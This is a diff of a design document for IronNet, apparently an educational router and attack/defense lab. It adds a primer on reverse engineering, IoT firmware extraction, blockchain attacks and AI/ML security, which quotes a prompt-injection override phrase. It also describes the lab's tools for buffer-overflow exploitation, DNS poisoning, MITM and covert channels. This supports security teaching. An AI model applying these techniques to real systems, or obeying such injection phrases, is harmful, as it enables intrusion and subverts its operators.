+4. Persistence (survive reboot)
+```
+
+Each step may require a separate zero-day.
+
+---
+
+### 15.14 Reverse Engineering [NOT IMPLEMENTED]
+
+**Static analysis:** Examine binary without executing it
+- Disassembly: convert machine code to assembly (IDA Pro, Ghidra)
+- Decompilation: convert to pseudo-C (Ghidra, Hex-Rays)
+- String analysis: find hardcoded URLs, passwords, keys
+- Import analysis: what system calls does it make?
+
+**Dynamic analysis:** Execute and observe behavior
+- Debugger: step through code (gdb, x64dbg, WinDbg)
+- Strace/ltrace: trace system calls and library calls
+- Process Monitor: observe file/registry/network activity
+- Sandbox: run in isolated environment, observe behavior (Cuckoo, Any.Run)
+
+**Anti-reverse engineering:**
+- Obfuscation: rename functions, insert dead code, flatten control flow
+- Anti-debug: detect debugger presence (IsDebuggerPresent, timing checks)
+- Code virtualization: translate code to custom bytecode (VMProtect, Themida)
+- Self-modifying code: decrypt code at runtime
+
+---
+
+### 15.15 IoT and Embedded Device Attacks [NOT IMPLEMENTED]
+
+**Common IoT vulnerabilities:**
+- Default credentials (admin/admin, root/root)
+- Unencrypted communication (HTTP, telnet, MQTT without TLS)
+- No firmware update mechanism (or unsigned updates)
+- Debug interfaces left enabled (UART, JTAG)
+- Hardcoded keys in firmware
+
+**Firmware extraction and analysis:**
+1. Download firmware from vendor website (or dump via JTAG/SPI)
+2. Extract filesystem: `binwalk -e firmware.bin`
+3. Find interesting files: `/etc/shadow`, config files, private keys
+4. Identify vulnerabilities: buffer overflows in web interface, command injection
+
+**Mirai botnet (2016):**
+- Scanned for IoT devices with default credentials
+- Infected 600,000+ devices (cameras, routers, DVRs)
+- Launched 1.2 Tbps DDoS attack against Dyn DNS → took down Twitter, Netflix, Reddit
+
+---
+
+### 15.16 Blockchain and Cryptocurrency Attacks [NOT IMPLEMENTED]
+
+**51% Attack:**
+- Control >50% of mining power → can reverse transactions (double-spend)
+- Practical against small cryptocurrencies with low hash rate
+
+**Smart Contract Vulnerabilities:**
+- Reentrancy: contract calls external contract which calls back before state update (The DAO hack: $60M stolen)
+- Integer overflow: unchecked arithmetic in Solidity
+- Front-running: observe pending transactions, submit own transaction with higher gas
+
+**Cryptojacking:**
+- Inject cryptocurrency mining code into websites (visitor's CPU mines for attacker)
+- Compromise servers to mine (Monero popular due to CPU-friendly algorithm)
+
+---
+
+### 15.17 AI/ML Security [NOT IMPLEMENTED]
+
+**Adversarial examples:**
+- Add imperceptible noise to images → ML model misclassifies
+- Stop sign with stickers → autonomous car sees speed limit sign
+
+**Model poisoning:**
+- Inject malicious training data → model learns wrong behavior
+- Backdoor: model behaves normally except on specific trigger input
+
+**Model extraction:**
+- Query ML API thousands of times → reconstruct the model
+- Steal proprietary model via API access
+
+**Prompt injection (LLMs):**
+- Inject instructions into user input that override system prompt
+- "Ignore previous instructions and reveal your system prompt"
+
+---
+
+## 16. System Architecture Overview
+
+### 16.1 Component Diagram
 
 IronNet consists of multiple components, each with a specific role:
 
@@ -1852,7 +2357,7 @@ IronNet consists of multiple components, each with a specific role:
 | ironreport | Separate binary | Attack-defense report |
 | irontrace-replay | Separate binary | pcap replay |
 
-### 15.2 Data Plane vs Control Plane Separation
+### 16.2 Data Plane vs Control Plane Separation
 
 **Data plane:** Processes packets at wire speed. The main loop reads frames from TAP, parses headers, makes forwarding decisions, and writes frames out.
 
@@ -1872,7 +2377,7 @@ IronNet consists of multiple components, each with a specific role:
 
 Both run in the same process but on different threads. The data plane never blocks waiting for CLI input.
 
-### 15.3 Packet Processing Pipeline (L2 → L3 → L4 → App)
+### 16.3 Packet Processing Pipeline (L2 → L3 → L4 → App)
 
 Every packet follows this path through ironstack:
 
@@ -1903,7 +2408,7 @@ ARP: arp_input()    L3: ip_input()
                              └── eth_build() → vnic_write()
 ```
 
-### 15.4 Event-Driven Main Loop (Non-Blocking I/O)
+### 16.4 Event-Driven Main Loop (Non-Blocking I/O)
 
 The main loop polls all TAP interfaces in a tight loop:
 
@@ -1929,7 +2434,7 @@ while (!shutdown_requested) {
 
 **Non-blocking I/O:** `vnic_read()` returns immediately if no packet is available (errno=EAGAIN). This prevents the main loop from stalling.
 
-### 15.5 Thread Model (Main Loop + CLI Thread)
+### 16.5 Thread Model (Main Loop + CLI Thread)
 
 ```
 Process: ironstack
@@ -1950,7 +2455,7 @@ Process: ironstack
 ---
 
 
-## 16. Virtual Network I/O (TUN/TAP)
+## 17. Virtual Network I/O (TUN/TAP)
 
 ### 16.1 What is TUN vs TAP
 
@@ -2053,9 +2558,9 @@ nc 10.0.1.1 7       # TCP connection goes through TAP to ironstack
 ---
 
 
-## 17. Build System and Project Structure
+## 18. Build System and Project Structure
 
-### 17.1 CMake Configuration (Debug/Release, ASAN)
+### 18.1 CMake Configuration (Debug/Release, ASAN)
 
 The project uses CMake with two build modes:
 
@@ -2074,7 +2579,7 @@ cmake ../src -DCMAKE_BUILD_TYPE=Release
 
 ASAN detects memory errors at runtime: buffer overflows, use-after-free, double-free, memory leaks. Essential for the vulnerable server demos.
 
-### 17.2 Directory Layout
+### 18.2 Directory Layout
 
 ```
 IronNet/
@@ -2111,7 +2616,7 @@ IronNet/
 └── codebase_analysis.md          # This document
 ```
 
-### 17.3 Library Targets
+### 18.3 Library Targets
 
 Libraries are linked into the ironstack daemon:
 
@@ -2126,7 +2631,7 @@ Libraries are linked into the ironstack daemon:
 | `iron_load` | `ironload/` | Stress test functions |
 | `iron_trace` | `irontrace/` | pcap writer, trace hooks |
 
-### 17.4 Binary Targets
+### 18.4 Binary Targets
 
 | Binary | Source | Purpose |
 |--------|--------|---------|
@@ -2139,7 +2644,7 @@ Libraries are linked into the ironstack daemon:
 | `ironreport` | `ironprobe_ext/report.c` | Attack-defense report |
 | `irontrace-replay` | `irontrace/replay.c` | pcap replay |
 
-### 17.5 Test Infrastructure (Unit Tests, Module Tests, CTest)
+### 18.5 Test Infrastructure (Unit Tests, Module Tests, CTest)
 
 **Unit tests (21):** Fast, minimal output. Test one module in isolation with stubs for dependencies. Output: PASS/FAIL.
 
@@ -2155,7 +2660,7 @@ Libraries are linked into the ironstack daemon:
 - `app_stub.c` — no-op app socket functions
 - `ip_output_stub.c` — no-op IP output
 
-### 17.6 WSL Path Spaces Workaround
+### 18.6 WSL Path Spaces Workaround
 
 WSL paths with spaces (e.g., `OneDrive - Ericsson`) cause issues with `getcwd()` in some tools. Workaround: create a symlink:
 
@@ -2166,9 +2671,9 @@ cd ~/ironnet/build
 
 ---
 
-## 18. Configuration System
+## 19. Configuration System
 
-### 18.1 router.conf Format
+### 19.1 router.conf Format
 
 The router configuration file uses a simple line-based format:
 
@@ -2193,7 +2698,7 @@ acl permit tcp any any port 9999
 - `route <prefix>/<len> via <next-hop> dev <name>` — static route with gateway
 - `acl <permit|deny> <tcp|udp|icmp|any> any any port <port>` — ACL rule
 
-### 18.2 Config Parser Implementation
+### 19.2 Config Parser Implementation
 
 `router_conf.c` reads the file line by line:
 1. Skip empty lines and comments (`#`)
@@ -2203,7 +2708,7 @@ acl permit tcp any any port 9999
 
 The parser is intentionally simple — no complex grammar, no nested structures.
 
-### 18.3 Runtime CLI Configuration (ironctl Commands)
+### 19.3 Runtime CLI Configuration (ironctl Commands)
 
 After startup, the CLI allows live modification:
 
@@ -2218,7 +2723,7 @@ ironctl> show stats
 
 Changes take effect immediately — the next packet processed uses the updated configuration.
 
-### 18.4 Defense Enable/Disable at Runtime
+### 19.4 Defense Enable/Disable at Runtime
 
 All 12 defenses start disabled and can be toggled at runtime:
 
@@ -2247,9 +2752,9 @@ This allows testing attacks with and without defenses to compare effectiveness.
 ---
 
 
-## 19. Common Utilities (`src/common/`)
+## 20. Common Utilities (`src/common/`)
 
-### 19.1 `types.h` — Network Types, Enums, Drop Reasons
+### 20.1 `types.h` — Network Types, Enums, Drop Reasons
 
 Defines the vocabulary used across all modules:
 
@@ -2262,7 +2767,7 @@ typedef enum { ACL_PERMIT, ACL_DENY } acl_action_t;
 typedef enum { TCP_CLOSED, TCP_SYN_RECV, TCP_ESTABLISHED, ... } tcp_state_t;
 ```
 
-### 19.2 `log.h/c` — Timestamped Leveled Logging
+### 20.2 `log.h/c` — Timestamped Leveled Logging
 
 ```c
 LOG_DBG("MODULE", "debug message %d", value);   // only shown with -d flag
@@ -2275,7 +2780,7 @@ Output: `[26506.088852] [INFO ] [MAIN] IronNet v0.1.0 starting...`
 
 Timestamp uses `CLOCK_MONOTONIC` (seconds since boot, not wall clock).
 
-### 19.3 `stats.h/c` — Global Counter Infrastructure
+### 20.3 `stats.h/c` — Global Counter Infrastructure
 
 64 named counters tracking every important event:
 
@@ -2287,7 +2792,7 @@ iron_stats_dump();  // prints all non-zero counters
 
 Categories: L2 (rx/tx/drops), L3 (rx/tx/forward/drops by reason), TCP (created/closed/half-open/drops), UDP (rx).
 
-### 19.4 `utils.h/c` — Byte-Order, Checksum, IP String Conversion
+### 20.4 `utils.h/c` — Byte-Order, Checksum, IP String Conversion
 
 **Byte-order:** Network protocols use big-endian. x86 CPUs use little-endian.
 ```c
@@ -2306,7 +2811,7 @@ char *iron_ip_to_str(uint32_t ip, char *buf, int len);  // 0x0100000A → "10.0.
 uint32_t iron_str_to_ip(const char *str);               // "10.0.1.1" → 0x0101000A
 ```
 
-### 19.5 `assert.h` — IRON_ASSERT Invariant Enforcement
+### 20.5 `assert.h` — IRON_ASSERT Invariant Enforcement
 
 ```c
 IRON_ASSERT(condition, "CATEGORY", "message %d", value);
@@ -2316,9 +2821,9 @@ On failure: prints category/file/line/message, increments failure counter, calls
 
 ---
 
-## 20. Protocol Stack Core (`src/ironstack/`)
+## 21. Protocol Stack Core (`src/ironstack/`)
 
-### 20.1 `main.c` — Daemon Entry Point
+### 21.1 `main.c` — Daemon Entry Point
 
 ```c
 int main(int argc, char **argv) {
@@ -2331,7 +2836,7 @@ int main(int argc, char **argv) {
 }
 ```
 
-### 20.2 `core/pipeline.c` — Packet Processing Loop
+### 21.2 `core/pipeline.c` — Packet Processing Loop
 
 The heart of the system:
 ```c
@@ -2356,7 +2861,7 @@ void iron_pipeline_run_once(void) {
 
 Also initializes all subsystems at startup and loads the config file.
 
-### 20.3 `core/iface.c` — Interface Configuration Model
+### 21.3 `core/iface.c` — Interface Configuration Model
 
 Each interface has: name, MAC, IP, prefix length, vnic index.
 
@@ -2368,14 +2873,14 @@ iface_config_t *iface_find_by_ip(uint32_t ip);
 bool iface_is_local_ip(uint32_t ip);  // checks all interfaces
 ```
 
-### 20.4 `core/router_conf.c` — Config File Parser
+### 21.4 `core/router_conf.c` — Config File Parser
 
 Reads `router.conf` line by line, dispatches to handlers:
 - `handle_interface()` → `iface_add()`
 - `handle_route()` → `route_add()`
 - `handle_acl()` → `acl_add_rule()`
 
-### 20.5 `io/vnic.c` — TAP Device Abstraction
+### 21.5 `io/vnic.c` — TAP Device Abstraction
 
 ```c
 int vnic_create(const char *name, uint8_t mac[6]);  // opens /dev/net/tun, creates TAP
@@ -2386,9 +2891,9 @@ int vnic_inject(int idx, const uint8_t *buf, int len); // same as write (for tes
 
 ---
 
-## 21. Layer 2 Implementation (`src/ironstack/l2/`)
+## 22. Layer 2 Implementation (`src/ironstack/l2/`)
 
-### 21.1 `eth.c` — Ethernet Frame Parse/Build/Dispatch
+### 22.1 `eth.c` — Ethernet Frame Parse/Build/Dispatch
 
 **eth_parse():** Validates frame (≥14 bytes), extracts dst/src MAC, EtherType, payload pointer.
 
@@ -2400,7 +2905,7 @@ int vnic_inject(int idx, const uint8_t *buf, int len); // same as write (for tes
 - `0x8100` → VLAN strict check (if enabled, drop tagged frames)
 - Other → drop, increment counter
 
-### 21.2 `arp.c` — ARP Table, Request/Reply, Inspection
+### 22.2 `arp.c` — ARP Table, Request/Reply, Inspection
 
 **ARP table:** 128 entries, each: IP → MAC + timestamp. Entries age out after 300 seconds.
 
@@ -2412,7 +2917,7 @@ int vnic_inject(int idx, const uint8_t *buf, int len); // same as write (for tes
 
 **MITM detection:** If `mitm-detect` enabled and an existing entry's MAC changes → log warning.
 
-### 21.3 `vlan.c` — 802.1Q Tag Insert/Strip
+### 22.3 `vlan.c` — 802.1Q Tag Insert/Strip
 
 **vlan_ingress():** On trunk port: strip 4-byte tag, extract VID. On access port: assign port's VLAN.
 
@@ -2420,7 +2925,7 @@ int vnic_inject(int idx, const uint8_t *buf, int len); // same as write (for tes
 
 **Port config:** Each port has mode (access/trunk), access VLAN, trunk allowed bitmap (4096 bits).
 
-### 21.4 `bridge.c` — MAC Learning, Unicast Forwarding, Flooding
+### 22.4 `bridge.c` — MAC Learning, Unicast Forwarding, Flooding
 
 **MAC table:** 256 entries: MAC → port + VLAN + timestamp.
 
@@ -2435,9 +2940,9 @@ int vnic_inject(int idx, const uint8_t *buf, int len); // same as write (for tes
 ---
 
 
-## 22. Layer 3 Implementation (`src/ironstack/l3/`)
+## 23. Layer 3 Implementation (`src/ironstack/l3/`)
 
-### 22.1 `ip.c` — IP Input/Output, Validation, Forwarding
+### 23.1 `ip.c` — IP Input/Output, Validation, Forwarding
 
 **ip_input() flow:**
 1. Validate: version=4, IHL≥5, checksum correct, TTL>0
@@ -2449,7 +2954,7 @@ int vnic_inject(int idx, const uint8_t *buf, int len); // same as write (for tes
 
 **ip_output():** Build IP header (version, TTL=64, protocol, src/dst), compute checksum, route lookup, ARP resolve, build Ethernet frame, write to TAP.
 
-### 22.2 `route.c` — Routing Table, Longest-Prefix Match
+### 23.2 `route.c` — Routing Table, Longest-Prefix Match
 
 128-entry FIB. Each entry: prefix (IP + prefix_len), next_hop, out_iface, hit_count.
 
@@ -2458,11 +2963,11 @@ int route_lookup(uint32_t dst_ip, uint32_t *next_hop, int *out_iface);
 ```
 Scans all entries, finds the one with longest matching prefix. Returns next_hop and output interface.
 
-### 22.3 `route_table.c` — Multiple Named Routing Tables (VRF-lite)
+### 23.3 `route_table.c` — Multiple Named Routing Tables (VRF-lite)
 
 Up to 8 named tables ("main", "mgmt", custom). Each has independent FIB. PBR can select which table to use.
 
-### 22.4 `acl.c` — Access Control List, First-Match Evaluation
+### 23.4 `acl.c` — Access Control List, First-Match Evaluation
 
 Ordered rule list (max 64 rules). Each rule: match criteria + action (PERMIT/DENY).
 
@@ -2471,19 +2976,19 @@ acl_action_t acl_evaluate(src_ip, dst_ip, protocol, src_port, dst_port);
 ```
 Top-down scan, first match wins. Default policy (PERMIT or DENY) if no rule matches.
 
-### 22.5 `pbr.c` — Policy-Based Routing, Loop Detection
+### 23.5 `pbr.c` — Policy-Based Routing, Loop Detection
 
 PBR overrides normal routing based on source IP, destination IP, protocol. Evaluated before FIB lookup.
 
 **Loop detection:** Tracks visited hops in `pkt_context_t`. If PBR would send to an already-visited hop → return -2 (loop).
 
-### 22.6 `icmp.c` — Echo Request/Reply, Redirect Handling
+### 23.6 `icmp.c` — Echo Request/Reply, Redirect Handling
 
 - Echo Request (type=8) → swap src/dst, change type to 0, recompute checksum, send reply
 - ICMP Redirect (type=5) → if `icmp-redirect-disable` enabled, ignore; otherwise add host route
 - Covert detection hook: check payload entropy and timing when `covert-detect` enabled
 
-### 22.7 `ip_frag.c` — Fragmentation and Reassembly
+### 23.7 `ip_frag.c` — Fragmentation and Reassembly
 
 **Fragmentation:** Split oversized packets into MTU-sized fragments with correct MF flag and offset.
 
@@ -2491,13 +2996,13 @@ PBR overrides normal routing based on source IP, destination IP, protocol. Evalu
 
 **Security:** Reject overlapping fragments, reject tiny fragments (<68 bytes), limit fragments per ID (max 64).
 
-### 22.8 `conntrack.c` — Connection Tracking
+### 23.8 `conntrack.c` — Connection Tracking
 
 Tracks flows by 5-tuple (src_ip, dst_ip, proto, src_port, dst_port). Bidirectional matching.
 
 States: NEW → ESTABLISHED (on reply) → expired (timeout). Per-protocol timeouts: TCP=300s, UDP=30s, ICMP=10s.
 
-### 22.9 `nat.c` — SNAT/DNAT, Port Allocation
+### 23.9 `nat.c` — SNAT/DNAT, Port Allocation
 
 **SNAT:** Match source prefix → rewrite src IP to public IP, allocate port from pool (10000-65000). Create mapping for return-path translation.
 
@@ -2507,9 +3012,9 @@ States: NEW → ESTABLISHED (on reply) → expired (timeout). Per-protocol timeo
 
 ---
 
-## 23. Layer 4 Implementation (`src/ironstack/l4/`)
+## 24. Layer 4 Implementation (`src/ironstack/l4/`)
 
-### 23.1 `tcp.c` — TCP State Machine, Connection Table, SYN Cookies, Output
+### 24.1 `tcp.c` — TCP State Machine, Connection Table, SYN Cookies, Output
 
 **Connection table:** 256 entries. Each: 4-tuple, state, seq/ack numbers, last_activity timestamp.
 
@@ -2527,15 +3032,15 @@ States: NEW → ESTABLISHED (on reply) → expired (timeout). Per-protocol timeo
 
 **Timers:** `tcp_timer_tick()` cleans up TIME_WAIT (60s) and idle connections (configurable timeout).
 
-### 23.2 `udp.c` — Stateless UDP Dispatch
+### 24.2 `udp.c` — Stateless UDP Dispatch
 
 Simple: parse header (8 bytes), extract ports, find registered listener, call `on_data` callback. No state, no connection tracking at L4 level.
 
 ---
 
-## 24. Security Module (`src/ironstack/security/`)
+## 25. Security Module (`src/ironstack/security/`)
 
-### 24.1 `defense.c` — Defense Registry, SYN Cookies, Rate Limiting
+### 25.1 `defense.c` — Defense Registry, SYN Cookies, Rate Limiting
 
 **Registry:** 16 named defenses, each with enable/disable state. `defense_is_enabled("name")` checked inline in the data path.
 
@@ -2548,7 +3053,7 @@ Cookie = hash of 4-tuple + secret. Validated when ACK arrives.
 
 **Rate limiting:** 64 per-source buckets. `rate_limit_check(src_ip)` returns false if source exceeded threshold. `rate_limit_tick()` resets all counters every second.
 
-### 24.2 `ipsec.c` — SA Lifecycle, Policy Enforcement, XOR Transform
+### 25.2 `ipsec.c` — SA Lifecycle, Policy Enforcement, XOR Transform
 
 **SA database:** 32 entries. Each: SPI, src/dst IP, direction, transform, key, timestamps, counters.
 
@@ -2558,7 +3063,7 @@ Cookie = hash of 4-tuple + secret. Validated when ACK arrives.
 
 **Fail-closed:** If policy says PROTECT but SA is missing/expired → drop (never send unprotected).
 
-### 24.3 `covert_detect.c` — Entropy Analysis, Timing Bimodality, ISN/DNS Detection
+### 25.3 `covert_detect.c` — Entropy Analysis, Timing Bimodality, ISN/DNS Detection
 
 **Shannon entropy:** `calc_entropy(data, len)` — measures information density (0=uniform, 8=max random).
 
@@ -2573,9 +3078,9 @@ Cookie = hash of 4-tuple + secret. Validated when ACK arrives.
 ---
 
 
-## 25. Application Servers (`src/ironapps/`)
+## 26. Application Servers (`src/ironapps/`)
 
-### 25.1 `app_socket.c` — Socket API, Listener Registry, TCP/UDP Output
+### 26.1 `app_socket.c` — Socket API, Listener Registry, TCP/UDP Output
 
 The application-facing API:
 ```c
@@ -2589,11 +3094,11 @@ int app_socket_send(dst_ip, dst_port, src_ip, src_port, protocol, data, len);
 
 **UDP output:** Builds UDP packet (8-byte header + payload), calls `ip_output()`.
 
-### 25.2 `echo_server.c` — TCP/UDP Echo (Port 7)
+### 26.2 `echo_server.c` — TCP/UDP Echo (Port 7)
 
 Simplest possible server: receives data, sends it back unchanged. Registered on both TCP and UDP port 7.
 
-### 25.3 `dns_server.c` — DNS Server with Zone Table, Cache, Response Builder
+### 26.3 `dns_server.c` — DNS Server with Zone Table, Cache, Response Builder
 
 **Zone table:** 16 static entries (example.com, ironnet.local, etc.).
 
@@ -2603,21 +3108,21 @@ Simplest possible server: receives data, sends it back unchanged. Registered on 
 
 **Response acceptance:** Incoming DNS responses (QR=1) are parsed and cached via `dns_cache_add_secure()` — simulates recursive resolver behavior for Kaminsky attack demonstration.
 
-### 25.4 `kv_server.c` — Key-Value Store (Port 6379)
+### 26.4 `kv_server.c` — Key-Value Store (Port 6379)
 
 Text protocol: `SET key value`, `GET key`, `DEL key`. 256-entry in-memory hash table. Responses: `+OK`, `$value`, `$nil`, `-ERR`.
 
-### 25.5 `http_server.c` — HTTP-Like Server (Port 8080)
+### 26.5 `http_server.c` — HTTP-Like Server (Port 8080)
 
 Parses `GET /path HTTP/1.0`. Returns 200 OK for `/` and `/index`, 404 for other paths, 400 for non-GET methods.
 
-### 25.6 `rpc_server.c` — Binary RPC Protocol (Port 9000)
+### 26.6 `rpc_server.c` — Binary RPC Protocol (Port 9000)
 
 Fixed-size header: `[MAGIC "IRON" 4B][CMD 2B][LENGTH 2B][PAYLOAD...]`
 
 Commands: PING→PONG, ECHO→ECHO_REPLY, STATUS→STATUS_REPLY. Invalid magic or unknown command → ERROR response.
 
-### 25.7 `vuln_server.c` — Intentionally Vulnerable Server (Port 9999)
+### 26.7 `vuln_server.c` — Intentionally Vulnerable Server (Port 9999)
 
 **Commands and vulnerabilities:**
 | Command | Vulnerability | CWE |
@@ -2632,9 +3137,9 @@ Commands: PING→PONG, ECHO→ECHO_REPLY, STATUS→STATUS_REPLY. Invalid magic o
 
 ---
 
-## 26. Attack Tools (`src/ironattack/`)
+## 27. Attack Tools (`src/ironattack/`)
 
-### 26.1 `main.c` — Subcommand Dispatch (12 Commands)
+### 27.1 `main.c` — Subcommand Dispatch (12 Commands)
 
 ```
 ironattack <subcommand> [options]
@@ -2647,7 +3152,7 @@ Subcommands:
 
 Each subcommand parses its own options and executes independently.
 
-### 26.2 `craft.c` — Raw Packet Construction
+### 27.2 `craft.c` — Raw Packet Construction
 
 Builds complete Ethernet+IP+TCP/ARP/ICMP frames from scratch:
 - `craft_tcp_syn()` — SYN packet with checksums
@@ -2662,11 +3167,11 @@ Builds complete Ethernet+IP+TCP/ARP/ICMP frames from scratch:
 
 **tap_write():** Strips Ethernet header (raw socket sends IP-level), sends via `sendto()`.
 
-### 26.3 `dns_spoof_ext.c` — External DNS Cache Poisoning
+### 27.3 `dns_spoof_ext.c` — External DNS Cache Poisoning
 
 Floods forged DNS responses with random transaction IDs. Source IP spoofed as upstream DNS (8.8.8.8). Targets ironstack's DNS server which accepts responses (QR=1) and caches them.
 
-### 26.4 `exploit.c` — Buffer Overflow Exploitation
+### 27.4 `exploit.c` — Buffer Overflow Exploitation
 
 Four modes targeting the vulnerable server (port 9999):
 - `crash` — send oversized input, trigger ASAN abort
@@ -2676,7 +3181,7 @@ Four modes targeting the vulnerable server (port 9999):
 
 Connects via normal TCP socket (no raw socket needed).
 
-### 26.5 `covert.c` — 6 Covert Channel Implementations
+### 27.5 `covert.c` — 6 Covert Channel Implementations
 
 | Mode | Channel type | Technique |
 |------|-------------|-----------|
@@ -2687,7 +3192,7 @@ Connects via normal TCP socket (no raw socket needed).
 | `counting` | Timing | Bit encoded as burst size per window |
 | `ipid` | Storage | 2 bytes per packet in IP ID field |
 
-### 26.6 `mitm.c` — MITM Relay Engine
+### 27.6 `mitm.c` — MITM Relay Engine
 
 Standalone binary (`ironmitm`):
 1. ARP-poisons both victims bidirectionally
@@ -2698,61 +3203,61 @@ Standalone binary (`ironmitm`):
 
 ---
 
-## 27. Supporting Tools
+## 28. Supporting Tools
 
-### 27.1 `ironctl/cli.c` — Embedded CLI
+### 28.1 `ironctl/cli.c` — Embedded CLI
 
 Spawns a pthread that reads stdin. Tokenizes input into argc/argv, dispatches to command handlers. Commands: show, route, acl, arp, defense, scan, ping, fuzz, load, trace, dns, tcp flush, audit, help, exit.
 
-### 27.2 `ironmon/audit.c` — Audit Ring Buffer, File Output
+### 28.2 `ironmon/audit.c` — Audit Ring Buffer, File Output
 
 256-event ring buffer. Each event: timestamp, type, src/dst IP, protocol, ports, detail string. Written to `/tmp/ironnet_audit.log` (append mode). JSON export via `audit_dump_json()`.
 
-### 27.3 `ironmon/stats_json.c` — JSON Stats Export
+### 28.3 `ironmon/stats_json.c` — JSON Stats Export
 
 Outputs all non-zero counters as JSON: `{"l2.rx_frames": 47, "l3.drops.acl": 3, ...}`
 
-### 27.4 `ironprobe/probe.c` — Internal Port Scanner
+### 28.4 `ironprobe/probe.c` — Internal Port Scanner
 
 Checks listener registry and ACL to determine port state (OPEN/FILTERED/CLOSED) without sending real packets. Fast, no sudo needed.
 
-### 27.5 `ironfuzz/fuzz.c` — Mutation Engine, Corpus, Seed Generators
+### 28.5 `ironfuzz/fuzz.c` — Mutation Engine, Corpus, Seed Generators
 
 8 mutation strategies: bit-flip, byte-flip, truncate, extend, boundary values, insert, delete, field-aware. Pre-built seeds for TCP SYN, DNS query, HTTP GET, RPC PING.
 
-### 27.6 `ironload/load.c` — Stress Tester
+### 28.6 `ironload/load.c` — Stress Tester
 
 4 test types: TCP flood (fill connection table), route stress (fill FIB), ACL stress (many rules), bandwidth (max packet rate). Reports: attempted/succeeded/rejected/elapsed/avg per op.
 
-### 27.7 `irontrace/trace.c` — pcap Capture with Pipeline Hooks
+### 28.7 `irontrace/trace.c` — pcap Capture with Pipeline Hooks
 
 Hooks at L2 RX/TX, L3 RX/TX, L4 RX. Writes pcap format (global header + per-packet header + data). CLI: `trace start/stop/status`.
 
-### 27.8 `irontrace/replay.c` — pcap Replay via Raw Socket
+### 28.8 `irontrace/replay.c` — pcap Replay via Raw Socket
 
 Reads pcap file, injects packets via IPPROTO_RAW + SO_BINDTODEVICE. Supports timed mode (preserve original delays) and fast mode (max speed).
 
-### 27.9 `ironsim/main.c` — Network Emulator
+### 28.9 `ironsim/main.c` — Network Emulator
 
 Spawns multiple ironstack instances (fork+exec) with generated configs. Creates TAP interfaces, assigns IPs, adds host routes, applies tc netem impairments (delay, loss, reorder). Clean shutdown via SIGTERM.
 
-### 27.10 `ironsim/test_traffic.c` — Traffic Generator
+### 28.10 `ironsim/test_traffic.c` — Traffic Generator
 
 Sends ICMP pings and TCP connections to all topology nodes. Reports: sent/received/loss/min/avg/max RTT per target.
 
-### 27.11 `ironprobe_ext/main.c` — External SYN Scanner
+### 28.11 `ironprobe_ext/main.c` — External SYN Scanner
 
 Sends real TCP SYN packets via raw socket, listens for SYN+ACK (open) or RST (closed) or timeout (filtered). Reports per-port state.
 
-### 27.12 `ironprobe_ext/report.c` — Automated Attack-Defense Report
+### 28.12 `ironprobe_ext/report.c` — Automated Attack-Defense Report
 
 Runs 5 attack/defense pairs programmatically, measures effectiveness with and without defenses, outputs formatted pass/fail report.
 
 ---
 
-## 28. Test Infrastructure (`src/tests/`)
+## 29. Test Infrastructure (`src/tests/`)
 
-### 28.1 Test Philosophy
+### 29.1 Test Philosophy
 
 | Type | Purpose | Output | Speed |
 |------|---------|--------|-------|
@@ -2762,7 +3267,7 @@ Runs 5 attack/defense pairs programmatically, measures effectiveness with and wi
 
 Unit tests use stubs to isolate the module under test. Module tests include multiple source files directly.
 
-### 28.2 Stub Pattern
+### 29.2 Stub Pattern
 
 Tests that include `tcp.c` need stubs for functions tcp.c calls but that aren't part of the test:
 
@@ -2775,7 +3280,7 @@ int defense_init(void) { return 0; }
 
 Stubs used: `defense_stub.c`, `audit_stub.c`, `trace_stub.c`, `covert_stub.c`, `app_stub.c`, `ip_output_stub.c`.
 
-### 28.3 Module Test Framework (`module_test.h`)
+### 29.3 Module Test Framework (`module_test.h`)
 
 Provides test registration and execution:
 ```c
@@ -2787,7 +3292,7 @@ mt_suite_run(&suite);  // runs all, prints summary
 
 Helpers: `mt_hex_dump()`, `mt_print_mac()`, `mt_print_ip()`.
 
-### 28.4 Unit Test Listing (21 Tests)
+### 29.4 Unit Test Listing (21 Tests)
 
 | Test | Module | Assertions |
 |------|--------|------------|
@@ -2813,7 +3318,7 @@ Helpers: `mt_hex_dump()`, `mt_print_mac()`, `mt_print_ip()`.
 | test_apps | kv/http/rpc | 11 (KV set/get/del/unknown, HTTP get/404/400, RPC ping/echo/bad magic/short) |
 | test_router_conf | router_conf.c | 5 (load config, interface parsed, routes parsed, ACL parsed, missing file) |
 
-### 28.5 Module Test Listing (11 Tests)
+### 29.5 Module Test Listing (11 Tests)
 
 | Test | What it demonstrates |
 |------|---------------------|
@@ -2832,9 +3337,9 @@ Helpers: `mt_hex_dump()`, `mt_print_mac()`, `mt_print_ip()`.
 ---
 
 
-## 29. Building IronNet
+## 30. Building IronNet
 
-### 29.1 Prerequisites (WSL2, Ubuntu, GCC, CMake)
+### 30.1 Prerequisites (WSL2, Ubuntu, GCC, CMake)
 
 ```bash
 # Windows: Install WSL2 with Ubuntu 22.04+
@@ -2847,7 +3352,7 @@ sudo apt install -y build-essential cmake dnsutils
 
 Required: GCC 12+, CMake 3.20+, Make.
 
-### 29.2 Debug Build (with ASAN)
+### 30.2 Debug Build (with ASAN)
 
 ```bash
 cd IronNet
@@ -2858,7 +3363,7 @@ make
 
 Debug build enables AddressSanitizer — detects buffer overflows, use-after-free, and other memory errors at runtime.
 
-### 29.3 Release Build (Optimized)
+### 30.3 Release Build (Optimized)
 
 ```bash
 mkdir -p build-release && cd build-release
@@ -2868,7 +3373,7 @@ make
 
 No ASAN, full optimization. Buffer overflows cause real undefined behavior instead of clean ASAN reports.
 
-### 29.4 Running Tests (ctest)
+### 30.4 Running Tests (ctest)
 
 ```bash
 cd IronNet/build
@@ -2876,7 +3381,7 @@ ctest --output-on-failure
 # Expected: 32 tests (21 unit + 11 module), all passing
 ```
 
-### 29.5 Troubleshooting Common Build Issues
+### 30.5 Troubleshooting Common Build Issues
 
 | Issue | Solution |
 |-------|----------|
@@ -2888,9 +3393,9 @@ ctest --output-on-failure
 
 ---
 
-## 30. Running the Virtual Router
+## 31. Running the Virtual Router
 
-### 30.1 Starting ironstack with Config File
+### 31.1 Starting ironstack with Config File
 
 ```bash
 cd IronNet/build
@@ -2898,14 +3403,14 @@ sudo ./ironstack/ironstack ../src/configs/router.conf      # normal
 sudo ./ironstack/ironstack -d ../src/configs/router.conf   # debug logging
 ```
 
-### 30.2 Linux-Side TAP Setup
+### 31.2 Linux-Side TAP Setup
 
 ```bash
 sudo ip addr add 10.0.1.2/24 dev iron0
 sudo ip link set iron0 up
 ```
 
